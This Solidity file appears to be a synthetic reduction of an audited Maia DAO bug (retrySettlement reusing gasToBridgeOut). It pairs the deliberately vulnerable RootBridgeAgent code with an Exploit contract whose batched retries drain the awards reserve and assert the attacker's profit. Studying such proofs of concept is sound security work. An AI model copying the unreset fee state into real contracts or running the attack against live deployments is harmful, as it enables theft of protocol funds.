// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO (Ulysses omnichain) — An attacker can steal Accumulated Awards from
    RootBridgeAgent by abusing retrySettlement() (Code4rena 2023-05, [H-11], #26045)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    RootBridgeAgent.retrySettlement / _retrySettlement / _manageGasOut gas-accounting
    is inlined VERBATIM, including the blamed line:

        settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut;   // never reset

    When several retrySettlement() calls run inside a single anyExecute (initialGas > 0),
    `userFeeInfo.gasToBridgeOut` is set ONCE from the user's single branch-chain payment
    but is NEVER cleared between retries. Each _retrySettlement -> _manageGasOut therefore
    pulls the SAME `gasToBridgeOut` out of the Root reserve again and again. The user paid
    for one bridge-out but funds N of them — the extra (N-1) come from the accumulated
    awards. The attacker is refunded the unused gas on the branch, so N retries funded by
    one payment net them (N-1)*gasToBridgeOut, and the Root reserve no longer matches
    `accumulatedFees` (sweep() bricks).

    The omnichain plumbing (Multichain/anyCall relaying, AMM gas swaps, tx.gasprice /
    gasleft fee accounting, VirtualAccount/MulticallRootRouter routing, branch execution)
    is reduced to its economic effect: each remote _manageGasOut moves `gasToBridgeOut`
    of wrappedNative out of the Root reserve and refunds it to the attacker (the branch
    refund). The double-spend — one payment, N outflows — is preserved verbatim.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal wrapped-native ERC20 (the Root reserve / accumulated-awards token).
contract WrappedNative {
    string public constant name = "Wrapped Native";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

enum SettlementStatus {
    Success,
    Failed
}

/// @notice Reduced RootBridgeAgent. Holds the accumulated-awards reserve (wrappedNative)
///         and reproduces the retrySettlement gas double-spend verbatim.
contract RootBridgeAgent {
    error NotDao();

    struct Settlement {
        address owner;
        uint24 toChain;
        uint128 gasToBridgeOut;
        bytes callData;
        SettlementStatus status;
    }

    struct UserFeeInfo {
        uint128 depositedGas;
        uint128 gasToBridgeOut;
    }

    uint24 public immutable localChainId;
    WrappedNative public immutable wrappedNativeToken;
    address public immutable daoAddress;
    // In the real system the gas that goes "out" to a remote branch is refunded to the
    // caller on that branch. Locally we send it straight to this sink (the attacker).
    address public branchRefundSink;

    uint256 public initialGas;
    UserFeeInfo public userFeeInfo;

    /// @notice Booked accumulated awards/fees (must match the wrappedNative held).
    uint256 public accumulatedFees;

    mapping(uint32 => Settlement) public getSettlement;

    constructor(uint24 _localChainId, WrappedNative _weth, address _dao) {
        localChainId = _localChainId;
        wrappedNativeToken = _weth;
        daoAddress = _dao;
        accumulatedFees = 1; // avoid paying 20k gas on first payExecutionGas (as in the real contract)
    }

    function setBranchRefundSink(address sink) external {
        branchRefundSink = sink;
    }

    /// @notice Seed the accumulated-awards reserve (protocol yield sitting in the Root).
    function seedReserve(uint256 amount) external {
        wrappedNativeToken.transferFrom(msg.sender, address(this), amount);
        accumulatedFees += amount;
    }

    /// @notice Seed a "failed" settlement that becomes retryable (owner set, status Failed).
    function seedFailedSettlement(uint32 nonce, address owner, uint24 toChain, uint128 gasToBridgeOut) external {
        getSettlement[nonce] = Settlement({
            owner: owner,
            toChain: toChain,
            gasToBridgeOut: gasToBridgeOut,
            callData: new bytes(32), // >= 16 bytes so the verbatim 16-byte overwrite is valid
            status: SettlementStatus.Failed
        });
    }

    /*//////////////// retrySettlement (VERBATIM) ////////////////*/
    function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }

    /*//////////////// _retrySettlement (VERBATIM — the reused gasToBridgeOut) ////////////////*/
    function _retrySettlement(uint32 _settlementNonce) internal returns (bool) {
        //Get Settlement
        Settlement memory settlement = getSettlement[_settlementNonce];

        //Check if Settlement hasn't been redeemed.
        if (settlement.owner == address(0)) return false;

        //abi encodePacked
        bytes memory newGas = abi.encodePacked(_manageGasOut(settlement.toChain));

        //overwrite last 16bytes of callData
        for (uint256 i = 0; i < newGas.length;) {
            settlement.callData[settlement.callData.length - 16 + i] = newGas[i];
            unchecked {
                ++i;
            }
        }

        Settlement storage settlementReference = getSettlement[_settlementNonce];

        //Update Gas To Bridge Out
        settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut; // @> VULN: userFeeInfo.gasToBridgeOut is NEVER reset -> the next retry's _manageGasOut re-spends it from the reserve

        //Set Settlement Calldata to send to Branch Chain
        settlementReference.callData = settlement.callData;

        //Update Settlement Status
        settlementReference.status = SettlementStatus.Success;

        //Retry call with additional gas (_performCall to the branch — reduced away)
        return true;
    }

    /*//////////////// _manageGasOut (VERBATIM shape — pulls gasToBridgeOut from the reserve) ////////////////*/
    function _manageGasOut(uint24 _toChain) internal returns (uint128) {
        uint256 _initialGas = initialGas;

        if (_toChain == localChainId) {
            //Transfer gasToBridgeOut to Local Branch Bridge Agent if remote initiated call.
            if (_initialGas > 0) {
                wrappedNativeToken.transfer(branchRefundSink, userFeeInfo.gasToBridgeOut);
            }
            return uint128(userFeeInfo.gasToBridgeOut);
        }

        if (_initialGas > 0) {
            // remote branch: swap `gasToBridgeOut` of wrappedNative out and send it to the
            // branch; the branch refunds the (crafted-to-be-unused) gas to the attacker.
            _gasSwapOut(userFeeInfo.gasToBridgeOut, _toChain);
        } else {
            _gasSwapOut(msg.value, _toChain);
        }
        return uint128(userFeeInfo.gasToBridgeOut);
    }

    /// @dev Reduced _gasSwapOut: wrappedNative leaves the Root reserve to fund the branch,
    ///      and the unused gas is refunded to the attacker (models the cross-chain refund).
    function _gasSwapOut(uint256 amount, uint24 /*toChain*/ ) internal {
        wrappedNativeToken.transfer(branchRefundSink, amount);
    }

    /*//////////////// the malicious anyExecute batch (initialGas > 0) ////////////////*/
    /// @notice Models a single anyExecute() carrying N retrySettlement() calls routed
    ///         through the VirtualAccount/MulticallRootRouter. The user pays ONE
    ///         `gasToBridgeOut`; the batch then retries N settlements, each reusing it.
    function anyExecuteRetryBatch(uint32[] calldata nonces, uint128 depositedGas, uint128 gasToBridgeOut) external {
        // anyExecute checkpoints initialGas and records the user's single fee payment.
        initialGas = 1; // gasleft() checkpoint > 0 (reduced)
        userFeeInfo.depositedGas = depositedGas;
        userFeeInfo.gasToBridgeOut = gasToBridgeOut;

        // The user's SINGLE branch-chain gas payment arrives once.
        wrappedNativeToken.transferFrom(msg.sender, address(this), gasToBridgeOut);

        // The crafted batch retries every failed settlement — each reuses the same
        // userFeeInfo.gasToBridgeOut because it is never cleared.
        for (uint256 i = 0; i < nonces.length;) {
            _retrySettlement(nonces[i]);
            unchecked {
                ++i;
            }
        }

        // anyExecute epilogue (_payExecutionGas / cleanup) — reduced.
        initialGas = 0;
        delete userFeeInfo;
    }

    /*//////////////// sweep (VERBATIM shape — bricks on the mismatch) ////////////////*/
    function sweep() external {
        if (msg.sender != daoAddress) revert NotDao();
        uint256 _accumulatedFees = accumulatedFees - 1;
        accumulatedFees = 1;
        // reverts if the reserve no longer backs the booked fees (the mismatch)
        wrappedNativeToken.transfer(daoAddress, _accumulatedFees);
    }
}

/// @notice Orchestrates: fund the Root reserve with accumulated awards, seed N failed
///         settlements, then run the malicious retry batch and cash the double-spend out.
///         The Exploit is both the fee payer and the branch refund sink (the attacker),
///         and the DAO fee recipient (so sweep()'s auth passes and the brick is the
///         reserve/accumulatedFees mismatch, not an access-control revert).
contract Exploit {
    uint24 public constant ROOT_CHAIN = 1;
    uint24 public constant BRANCH_CHAIN = 2; // remote branch (triggers the _gasSwapOut path)
    uint256 public constant RESERVE = 100 ether; // accumulated awards sitting in the Root
    uint128 public constant GAS_TO_BRIDGE_OUT = 1 ether; // the user's single payment
    uint256 public constant N = 3; // number of failed settlements retried in one batch

    WrappedNative public weth;
    RootBridgeAgent public agent;

    // observability
    uint256 public attackerStart;
    uint256 public attackerEnd;
    uint256 public reserveEnd;
    uint256 public accumulatedFeesBook;
    bool public sweepBricked;

    constructor() {
        weth = new WrappedNative();                               // CREATE(exploit, 1)
        agent = new RootBridgeAgent(ROOT_CHAIN, weth, address(this)); // CREATE(exploit, 2) — vulnerable; DAO = this
        agent.setBranchRefundSink(address(this));                // attacker = branch refund sink

        // Fund the Root reserve with 100 WETH of accumulated awards.
        weth.mint(address(this), RESERVE);
        weth.approve(address(agent), RESERVE);
        agent.seedReserve(RESERVE);

        // Give the attacker (this) a single 1 WETH stake to pay for ONE bridge-out.
        weth.mint(address(this), GAS_TO_BRIDGE_OUT);

        // Seed N failed settlements (owned by the attacker) targeting a REMOTE branch.
        for (uint32 i = 0; i < uint32(N); ++i) {
            agent.seedFailedSettlement(i + 1, address(this), BRANCH_CHAIN, GAS_TO_BRIDGE_OUT);
        }
    }

    function run() external {
        attackerStart = weth.balanceOf(address(this)); // 1 WETH honest stake

        // Approve and fire the malicious anyExecute batch: pay ONE gasToBridgeOut, retry N.
        weth.approve(address(agent), GAS_TO_BRIDGE_OUT);
        uint32[] memory nonces = new uint32[](N);
        for (uint256 i = 0; i < N; ++i) {
            nonces[i] = uint32(i + 1);
        }
        agent.anyExecuteRetryBatch(nonces, GAS_TO_BRIDGE_OUT, GAS_TO_BRIDGE_OUT);

        attackerEnd = weth.balanceOf(address(this));
        reserveEnd = weth.balanceOf(address(agent));
        accumulatedFeesBook = agent.accumulatedFees();

        // The Root reserve no longer backs the booked accumulated fees, so sweep() bricks.
        try agent.sweep() {
            sweepBricked = false;
        } catch {
            sweepBricked = true;
        }

        // HARM #1 (fund theft): the attacker paid for ONE bridge-out but funded N; the
        // extra (N-1) came from the accumulated awards. Net profit = (N-1)*gasToBridgeOut.
        require(attackerEnd > attackerStart, "attacker must profit");
        require(attackerEnd - attackerStart == (N - 1) * uint256(GAS_TO_BRIDGE_OUT), "profit != (N-1)*gasToBridgeOut");

        // HARM #2 (bricked awards): the reserve is now short of the booked accumulatedFees,
        // so sweep() of the remaining awards reverts and they are stuck.
        require(reserveEnd < accumulatedFeesBook, "reserve should be short of booked fees");
        require(sweepBricked, "sweep should brick on the mismatch");
    }
}
